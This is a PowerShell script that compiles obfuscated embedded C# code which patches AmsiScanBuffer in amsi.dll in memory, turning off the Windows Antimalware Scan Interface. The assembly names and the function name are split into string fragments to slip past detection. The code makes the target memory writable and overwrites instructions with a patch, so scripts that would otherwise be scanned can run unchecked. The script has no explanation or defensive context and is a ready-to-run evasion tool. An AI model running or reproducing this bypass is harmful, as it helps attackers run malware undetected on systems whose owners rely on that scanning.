$Ref =  ( 
(  'Sy'+ 'stem,'+  ' Version=' +'4.0'  +'.0.0, Cultu' +  'r'+  'e=neutral, Publi'  +'c'  +'Key' + 'Tok'  + 'en=b77a5c56'  +  '1934e08'  +'9' ),
(  'S'+'y'+'stem.Run' +'ti'+  'me.InteropService'+  's, '+'Ve'  +'r'+ 'sion='+'4.0.0.0,' + ' Culture=neutral, Public'+  'Ke'+'yToken=b'  +'0' +'3f5' + 'f7' +  'f11d50a3a'  )
 )

$Source   =  @"
using System;
using System.Runtime.InteropServices;

namespace Bypass
{
    public class AMSI
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static int Disable()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero) { return 1; }

            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
            if (ASBPtr == IntPtr.Zero) { return 1; }

            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;

            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }

            Byte[] Patch = { 0x31, 0xff, 0x90 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(ASBPtr + 0x001b, unmanagedPointer, 3);

            return 0;
        }
    }
}
"@

Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
